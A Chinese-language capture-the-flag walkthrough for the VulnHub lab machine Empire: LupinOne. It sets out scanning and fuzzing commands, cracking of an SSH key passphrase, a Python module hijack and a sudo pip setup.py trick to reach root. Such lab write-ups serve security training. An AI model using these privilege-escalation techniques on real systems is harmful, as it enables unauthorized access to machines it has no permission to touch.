靶场搭建

靶机下载地址：Empire: LupinOne ~ VulnHub

下载后使用 VirtualBox 导入，网络设置为 NAT 模式。攻击机使用 Kali Linux。

信息收集

主机发现
arp-scan -l
端口扫描
nmap --min-rate 10000 -p- 192.168.21.137
nmap -sV -sT -O -p22,80 192.168.21.137

开放端口：22（SSH）、80（HTTP）。

Web 目录爆破

robots.txt

访问 80 端口空白页面，查看 robots.txt 发现提示 ~myfiles 目录。

curl http://192.168.21.137/robots.txt
~myfiles 目录

查看 ~myfiles 页面源码，发现需要继续爆破文件目录。使用 dirb：

dirb http://192.168.21.137
~secret 与 SSH 密钥

使用 wfuzz 配合 ~ 前缀爆破隐藏目录：

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.21.137/~FUZZ --hc 404

发现 ~secret 目录。进入后找到 ~icex64 文件，内容为 BASE58 编码的 SSH 私钥。

使用在线工具或脚本解码 BASE58 得到 SSH 私钥。

SSH 私钥破解

BASE58 解码

将 ~icex64 中的 BASE58 编码内容保存为文件，使用 Bugku CTF 的 BASE58 解码工具或 Python 脚本解码，得到 SSH 私钥，保存为 id_rsa。

john 爆破
python2 /usr/share/john/ssh2john.py id_rsa > keyhash
john keyhash --wordlist=/usr/share/wordlists/fasttrack.txt

成功破解出密码：P@55w0rd!

修改私钥权限并 SSH 登录：

chmod 600 id_rsa
ssh icex64@192.168.21.137 -i id_rsa

提权至 arsene

heist.py 模块劫持

查看 sudo 权限：

sudo -l

发现可以以 arsene 用户身份执行 /usr/bin/python3.9 /home/arsene/heist.py。查看该脚本内容：

cat /home/arsene/heist.py

发现脚本开头 import webbrowser，在 /home/arsene/ 目录下创建恶意的 webbrowser.py 实现模块劫持：

echo 'import os; os.system("/bin/bash")' > /home/arsene/webbrowser.py

执行脚本提权：

sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py

提权至 root

pip 提权

切换为 arsene 后再次查看 sudo 权限：

sudo -l

发现可以免密执行 pip。在 /tmp 目录下创建恶意 setup.py：

cd /tmp
cat > setup.py << 'EOF'
import os
os.system("/bin/bash")
EOF

通过 pip 安装触发提权：

sudo pip install .

成功获取 root 权限。

Flag

获取 root 权限后读取 flag 文件完成渗透。
